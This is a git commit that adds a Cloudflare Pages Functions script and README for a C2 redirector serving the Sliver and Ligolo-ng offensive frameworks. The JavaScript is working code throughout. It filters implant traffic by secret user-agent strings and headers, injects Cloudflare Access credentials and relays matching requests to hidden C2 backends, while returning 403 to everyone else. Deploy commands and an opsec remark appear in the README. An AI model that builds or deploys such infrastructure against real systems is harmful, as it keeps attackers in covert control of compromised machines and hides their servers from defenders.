87c022998f1e52b34a6e7b5dc969bd6165fb9557
choi <sxc2679@rit.edu>
2025-01-01 00:53:30 -0500

    init

--- README.md
+++ README.md
@@ -1,2 +1,23 @@
-# CloudflarePagesRedirector
-Inspired by https://github.com/JumpsecLabs/CloudflareRedirector/tree/main
+# Cloudflare Pages Functions Redirector 
+
+Create C2 and Ligolo-ng redirector on Cloudflare Pages, using the Functions feature.  
+
+Blog(?) post (KOREAN): (TBD) 
+Inspired by: https://labs.jumpsec.com/putting-the-c2-in-c2loudflare/
+
+## Usage 
+
+```
+# Install wrangler 
+sudo apt update -y 
+sudo apt install npm nodejs -y 
+npm install wrangler --save-dev 
+npx wrangler login 
+
+# Deploy. Use FULL DIRECTORY name or $PWD. "." will NOT work. 
+npx wrangler pages deploy $PWD --project-name pagesrdr --branch=main
+```
+
+## MISC 
+
+- Use `wrangler.toml` if you prefer more opsec 
---
+++ functions/[[catchall]].js
@@ -0,0 +1,64 @@
+export async function onRequest(context) {
+
+    const SLIVER_ENDPOINT = "https://sliver.domain.com";
+    const LIGOLO_ENDPOINT = "https://ligolo.domain.com";
+    const SERVICE_CF_ID = "redacted.access";
+    const SERVICE_CF_SECRET = "redacted";
+    const SLIVER_HEADER_NAME = ["header1", "header2"];
+    const SLIVER_HEADER_VALUE = ["value1", "value2"];
+    const SLIVER_UA = "sliverua";
+    const LIGOLO_UA = "ligoloua";
+
+    const req = context.request;
+    const userAgent = req.headers.get("User-Agent");
+    let endpoint = ""; 
+
+    
+    // Ligolo - UA check 
+    if (userAgent && userAgent === LIGOLO_UA) {
+        endpoint = LIGOLO_ENDPOINT;
+    } 
+    // Sliver - HTTP Header & Value + UA & UA value
+    else{ 
+        for (let i = 0; i < SLIVER_HEADER_NAME.length; i++) {
+            const headerName = SLIVER_HEADER_NAME[i];
+            const headerValue = SLIVER_HEADER_VALUE[i];
+            const reqHeaderValue = req.headers.get(headerName);
+
+            if (!reqHeaderValue || reqHeaderValue !== headerValue) {
+                return new Response("Forbidden", { status: 403 });
+            }
+        }
+
+        if (!userAgent || userAgent !== SLIVER_UA) {
+            return new Response("Forbidden", { status: 403 });
+        }
+
+        endpoint = SLIVER_ENDPOINT;
+    }
+
+    // Build request for backend tunnel 
+    const originalUrl = new URL(req.url);
+    const tunnelUrl = new URL(originalUrl.pathname + originalUrl.search, endpoint).toString(); 
+    const modifiedHeaders = new Headers(req.headers);
+
+    const incomingCookie = req.headers.get("Cookie") || "";
+    if (!incomingCookie.includes("CF_Authorization=")) {
+        modifiedHeaders.set("CF-Access-Client-Id", SERVICE_CF_ID);
+        modifiedHeaders.set("CF-Access-Client-Secret", SERVICE_CF_SECRET);
+    } else {
+        modifiedHeaders.delete("CF-Access-Client-Id");
+        modifiedHeaders.delete("CF-Access-Client-Secret");
+    }
+
+    // Send it 
+    const tunnelRequest = new Request(tunnelUrl, {
+        method: req.method,
+        headers: modifiedHeaders,
+        body: req.body,
+    });
+    
+    const tunnelResponse = await fetch(tunnelRequest);
+
+    return tunnelResponse;
+}
